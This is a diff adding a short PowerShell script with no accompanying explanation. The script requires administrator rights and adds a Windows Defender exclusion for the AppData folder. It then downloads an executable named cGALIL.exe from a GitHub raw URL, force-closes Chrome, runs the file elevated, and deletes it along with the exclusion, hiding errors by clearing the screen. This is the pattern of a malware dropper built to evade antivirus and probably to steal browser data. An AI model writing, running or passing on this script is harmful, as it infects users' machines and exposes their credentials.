@@ -1,0 +1,28 @@
+If (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Error "This script must be run as Administrator."
+    exit
+}
+
+$appFolder = $env:APPDATA
+$exePath = "$appFolder\cGALIL.exe"
+
+try {
+    Add-MpPreference -ExclusionPath $appFolder
+} catch {
+    Clear-Host
+}
+Clear-Host
+
+$url = "https://github.com/hocijic397/MCL/raw/main/cGALIL.exe"
+Invoke-WebRequest -Uri $url -OutFile $exePath
+
+Stop-Process -Name "chrome"
+$proc = Start-Process -FilePath $exePath -Verb RunAs -PassThru
+$proc.WaitForExit()
+Remove-Item $exePath -Force
+try {
+    Remove-MpPreference -ExclusionPath $appFolder
+} catch {
+    Clear-Host
+}
+Clear-Host
